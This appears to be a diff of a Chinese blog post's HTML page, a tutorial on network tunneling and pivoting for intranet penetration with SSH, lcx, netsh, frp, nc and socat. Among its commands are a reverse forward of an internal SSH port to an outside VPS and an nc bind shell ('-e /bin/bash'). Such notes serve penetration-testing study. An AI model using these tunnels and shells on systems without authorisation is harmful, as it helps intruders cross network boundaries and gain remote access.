@@ -11,7 +11,7 @@
   <meta itemprop="name" content="网络隧道">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="1743">
+  <meta itemprop="wordCount" content="1700">
   <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/64/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="网络隧道">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/64\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  1743 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  1700 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/64\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>网络隧道</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1743 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>9 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1700 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>8 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,18 +152,63 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#1ssh">1、SSH</a></li>
+    <li><a href="#2lcx">2、Lcx</a></li>
+    <li><a href="#3netsh">3、Netsh</a></li>
+    <li><a href="#4frp">4、frp</a></li>
+    <li><a href="#5nc">5、nc</a>
       <ul>
-        <li></li>
+        <li><a href="#解决nc单次连接问题">解决nc单次连接问题</a></li>
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li><a href="#chisel">chisel</a>
+      <ul>
+        <li><a href="#代理">==代理==</a></li>
+        <li><a href="#二级代理二级端口转发">==二级代理+二级端口转发==</a></li>
+        <li><a href="#端口转发">==端口转发==</a></li>
+      </ul>
+    </li>
+    <li><a href="#earthworm">EarthWorm</a></li>
+    <li><a href="#gost">gost</a>
+      <ul>
+        <li><a href="#常用">常用</a></li>
+        <li><a href="#启动参数">启动参数</a></li>
+        <li><a href="#配置文件">配置文件</a></li>
+        <li><a href="#代理模式">代理模式</a></li>
+        <li><a href="#转发模式">转发模式</a></li>
+        <li><a href="#多层代理">多层代理</a></li>
+      </ul>
+    </li>
+    <li><a href="#msf">MSF</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#http---regeorg">HTTP - reGeorg</a>
+      <ul>
+        <li><a href="#regeorgproxifier">reGeorg+Proxifier</a></li>
+        <li><a href="#regeorgproxychains">reGeorg+proxychains</a></li>
+      </ul>
+    </li>
+    <li><a href="#icmp">ICMP</a></li>
+    <li><a href="#dns">DNS</a></li>
+    <li><a href="#毒刺-pystinger">毒刺-pystinger</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ngrok">Ngrok</a></li>
+    <li><a href="#frp">frp</a></li>
+    <li><a href="#nps">nps</a></li>
+    <li><a href="#spp">spp</a></li>
+  </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="概念" class="heading-element"><span>0.0.0.1  概念</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="概念" class="heading-element"><span>概念</span>
   <a href="#%e6%a6%82%e5%bf%b5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><ul>
+</h1><ul>
 <li>
 <p>端口转发：感觉更应该叫流量转发，将来自一个网络节点的数据包转发到另一个网络节点，一般分为本地端口转发、正向端口转发、反向端口转发等，举个例子，本地设置一个端口转发，将8888端口的流量转发到80端口，这样访问8888端口的流量就跑到了80端口上，实际上我们访问到的就是80端口的服务，实际应用中，它用于路由器或防火墙上，以允许从公共网络访问内网服务。</p>
 </li>
@@ -195,15 +240,15 @@
 </ul>
 <p>转发感觉和代理差不多，但又不完全像</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220057018.webp" alt="image-20231022005706243" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220057018.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220057018.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202310220057018.webp?size=large 2x" data-title="image-20231022005706243" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="一端口转发" class="heading-element"><span>0.0.0.2  一、端口转发</span>
+<h1 id="一端口转发" class="heading-element"><span>一、端口转发</span>
   <a href="#%e4%b8%80%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="1ssh" class="heading-element"><span>0.0.0.2.1  1、SSH</span>
+</h1><h2 id="1ssh" class="heading-element"><span>1、SSH</span>
   <a href="#1ssh" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://wangdoc.com/ssh/port-forwarding"target="_blank" rel="external nofollow noopener noreferrer">https://wangdoc.com/ssh/port-forwarding</a></p>
+</h2><p><a href="https://wangdoc.com/ssh/port-forwarding"target="_blank" rel="external nofollow noopener noreferrer">https://wangdoc.com/ssh/port-forwarding</a></p>
 <p><a href="https://www.zsythink.net/archives/2450"target="_blank" rel="external nofollow noopener noreferrer">https://www.zsythink.net/archives/2450</a></p>
 <p><a href="https://www.bilibili.com/video/BV1fm4y1W7VQ"target="_blank" rel="external nofollow noopener noreferrer">https://www.bilibili.com/video/BV1fm4y1W7VQ</a></p>
 <p>SSH 除了登录服务器，还有一大用途，就是作为加密通信的中介，充当两台服务器之间的通信加密跳板，使得原本不加密的通信变成加密通信。这个功能称为端口转发（port forwarding），又称 SSH 隧道（tunnel）。</p>
@@ -287,11 +332,11 @@
 </li>
 </ul>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401010221453.webp" alt="image-20240101022146785" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401010221453.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401010221453.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401010221453.webp?size=large 2x" data-title="image-20240101022146785" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="2lcx" class="heading-element"><span>0.0.0.2.2  2、Lcx</span>
+<h2 id="2lcx" class="heading-element"><span>2、Lcx</span>
   <a href="#2lcx" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://www.cnblogs.com/-mo-/p/11537339.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/-mo-/p/11537339.html</a></p>
+</h2><p><a href="https://www.cnblogs.com/-mo-/p/11537339.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/-mo-/p/11537339.html</a></p>
 <p>lcx是一款端口转发工具，有三个功能：</p>
 <ul>
 <li>第一个功能将本地端口转发到远程主机某个端口上（代理）</li>
@@ -342,22 +387,22 @@
 在内网主机上操作，将22端口的流量转发到VPS(114.118.80.138)的22222端口。相当于反向代理
 ./lcx -m 3 -h1 127.0.0.1 -p1 22 -h2 114.118.80.138 -p2 22222 
 我们连接VPS的2222端口，就相当于连接了内网主机的22端口。
-ssh root@114.118.80.138 2222</code></pre><h6 id="3netsh" class="heading-element"><span>0.0.0.2.3  3、Netsh</span>
+ssh root@114.118.80.138 2222</code></pre><h2 id="3netsh" class="heading-element"><span>3、Netsh</span>
   <a href="#3netsh" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>netsh 是==Windows自带==的命令行脚本工具，它可以建立端口映射。与LCX不同，netsh==不支持反向的端口转发==。</p>
+</h2><p>netsh 是==Windows自带==的命令行脚本工具，它可以建立端口映射。与LCX不同，netsh==不支持反向的端口转发==。</p>
 <p>和lcx类似，我们将外网服务器的80端口，转发到8888端口：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">portproxy</span> <span style="color:#58a1dd">add</span> <span style="color:#58a1dd">v4tov4</span> <span style="color:#58a1dd">listenport</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">8888</span> <span style="color:#58a1dd">connectport</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">80</span> <span style="color:#58a1dd">connectaddress</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">192.168</span>.<span style="color:#a6be9d">3.140</span></span></span></code></pre></div><p>通过以下命令可查询当前转发策略：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">Netsh</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">portproxy</span> <span style="color:#58a1dd">show</span> <span style="color:#58a1dd">all</span></span></span></code></pre></div><p>可通过delete命令删除策略：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">portproxy</span> <span style="color:#ff636f">delete</span> <span style="color:#58a1dd">v4tov4</span> <span style="color:#58a1dd">listenport</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">8888</span></span></span></code></pre></div><p>下面演示跳板机把内网的3389转发到自己的8888（正向代理）</p>
 <p>在外网服务器配置端口转发：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">portproxy</span> <span style="color:#58a1dd">add</span> <span style="color:#58a1dd">v4tov4</span> <span style="color:#58a1dd">listenaddress</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">192.168</span>.<span style="color:#a6be9d">3.140</span> <span style="color:#a6be9d">8888</span> <span style="color:#58a1dd">connectaddress</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">192.168</span>.<span style="color:#a6be9d">100.2</span> <span style="color:#58a1dd">connectport</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">3389</span></span></span></code></pre></div><p>删除策略：</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">portproxy</span> <span style="color:#ff636f">delete</span> <span style="color:#58a1dd">v4tov4listenport</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">8888</span> <span style="color:#58a1dd">listenaddress</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">192.168</span>.<span style="color:#a6be9d">3.140</span></span></span></code></pre></div><h6 id="4frp" class="heading-element"><span>0.0.0.2.4  4、frp</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#58a1dd">netsh</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">portproxy</span> <span style="color:#ff636f">delete</span> <span style="color:#58a1dd">v4tov4listenport</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">8888</span> <span style="color:#58a1dd">listenaddress</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">192.168</span>.<span style="color:#a6be9d">3.140</span></span></span></code></pre></div><h2 id="4frp" class="heading-element"><span>4、frp</span>
   <a href="#4frp" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p>
+</h2><p>frp 是一个高性能的反向代理应用，支持 tcp, udp, http, https 协议。</p>
 <p><a href="https://github.com/fatedier/frp/releases"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/fatedier/frp/releases</a></p>
 <p>服务端</p>
 <pre tabindex="0"><code>[common]
@@ -376,19 +421,22 @@ remote_port = 6000          #要转发到的远程端口!!!
 
 ./frpc -c frpc.ini</code></pre><p>然后连接服务端的6000端口就好，==注意连接的不是监听端口，而是客户端指定的端口==</p>
 <p>本地端口转发的话可以在本地同时开始服务端和客户端，ip指定本地就好</p>
-<h6 id="5nc" class="heading-element"><span>0.0.0.2.5  5、nc</span>
+<h2 id="5nc" class="heading-element"><span>5、nc</span>
   <a href="#5nc" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"target="_blank" rel="external nofollow noopener noreferrer">https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a></p>
+</h2><p><a href="https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"target="_blank" rel="external nofollow noopener noreferrer">https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</a></p>
 <p>nc的功能是很强大的，可以反弹shell、通讯、文件传输，甚至能端口转发</p>
 <p>正向转发，所有发往本机8888端口的流量都会跑到192.168.111.3的22端口</p>
 <pre tabindex="0"><code>nc -l -p 8888 -c &#34;nc 192.168.111.3 22&#34;
-#####或者使用管道符
+#或者使用管道符
 mkfifo /tmp/pipe &amp;&amp; nc -l -p 8888 &lt;/tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe
-#####or
-mknod /tmp/pipe p &amp;&amp; nc -l -p 8888 &lt; /tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe</code></pre><p>####### 解决nc单次连接问题</p>
-<p>常见nc版本</p>
+#or
+mknod /tmp/pipe p &amp;&amp; nc -l -p 8888 &lt; /tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe</code></pre><h3 id="解决nc单次连接问题" class="heading-element"><span>解决nc单次连接问题</span>
+  <a href="#%e8%a7%a3%e5%86%b3nc%e5%8d%95%e6%ac%a1%e8%bf%9e%e6%8e%a5%e9%97%ae%e9%a2%98" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>常见nc版本</p>
 <ul>
 <li>nc、ncat、netcat</li>
 <li>nc -c netcat-traditional</li>
@@ -397,21 +445,21 @@ mknod /tmp/pipe p &amp;&amp; nc -l -p 8888 &lt; /tmp/pipe | nc 192.168.19.153 22
 <pre tabindex="0"><code>while :; do (nc -l -p 8888 -c &#34;nc 192.168.19.153 22&#34;); done
 while [ 1 ]; do nc -l -p 8888 -c &#34;nc 192.168.19.153 22&#34;; done
 while [ 1 ]; do mkfifo /tmp/pipe &amp;&amp; nc -l -p 8888 &lt;/tmp/pipe | nc 192.168.19.153 22 &gt;/tmp/pipe; done</code></pre><p>socat</p>
-<pre tabindex="0"><code>##### 本地转发
+<pre tabindex="0"><code># 本地转发
 socat tcp-l:8888,reuseaddr,fork tcp:localhost:22
 
-##### 远程转发
+# 远程转发
 socat tcp-l:8888,fork,reuseaddr tcp:192.168.19.153:22</code></pre><p>ncat</p>
 <p><a href="https://nmap.org/ncat/"target="_blank" rel="external nofollow noopener noreferrer">https://nmap.org/ncat/</a></p>
 <p>当客户端与服务器断开连接时，服务器也会停止监听，可以通过选项’k’强制服务器保持连接状态并继续侦听端口：</p>
-<pre tabindex="0"><code>#####Now all the connections for port 80 will be forwarded to port 8080.
+<pre tabindex="0"><code>#Now all the connections for port 80 will be forwarded to port 8080.
 ncat -u -l 80 -c  &#39;ncat -u -l 8080&#39;
 
 ncat -l -k localhost 8080 --sh-exec &#34;ncat example.org 80&#34;</code></pre><p>netcat</p>
 <p><a href="http://netcat.sourceforge.net/download.php"target="_blank" rel="external nofollow noopener noreferrer">http://netcat.sourceforge.net/download.php</a></p>
 <pre tabindex="0"><code>netcat -l -p 1234 -e /bin/bash
 
-##### 把访问某个端口的数据转发到本地或远程端口
+# 把访问某个端口的数据转发到本地或远程端口
 netcat -L 127.0.0.1:22 -p 8080 -vvv
 netcat -L 192.168.10.1:80 -p 25000 -vvv</code></pre><p>nc结合ssh</p>
 <pre tabindex="0"><code>mkfifo pipe
@@ -424,18 +472,21 @@ nc 127.0.0.1 8000 &lt; b &gt; a &amp;
 nc -l 8001 &lt; a &gt; b &amp;</code></pre><p>在OS X bash上使用<a href="https://unix.stackexchange.com/questions/53641/how-to-make-bidirectional-pipe-between-two-programs"target="_blank" rel="external nofollow noopener noreferrer">双向管道</a>。该命令也可能在其他Unix上运行：</p>
 <pre tabindex="0"><code>nc 127.0.0.1 8000 &lt;&amp;1 | nc -l 8001 &gt;&amp;0</code></pre><p>Linux：</p>
 <pre tabindex="0"><code>mkfifo backpipe
-nc -l 12345 0&lt;backpipe | nc www.google.com 80 1&gt;backpipe</code></pre><h5 id="二socks代理" class="heading-element"><span>0.0.0.3  二、SOCKS代理</span>
+nc -l 12345 0&lt;backpipe | nc www.google.com 80 1&gt;backpipe</code></pre><h1 id="二socks代理" class="heading-element"><span>二、SOCKS代理</span>
   <a href="#%e4%ba%8csocks%e4%bb%a3%e7%90%86" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="chisel" class="heading-element"><span>0.0.0.3.1  chisel</span>
+</h1><h2 id="chisel" class="heading-element"><span>chisel</span>
   <a href="#chisel" class="heading-mark">
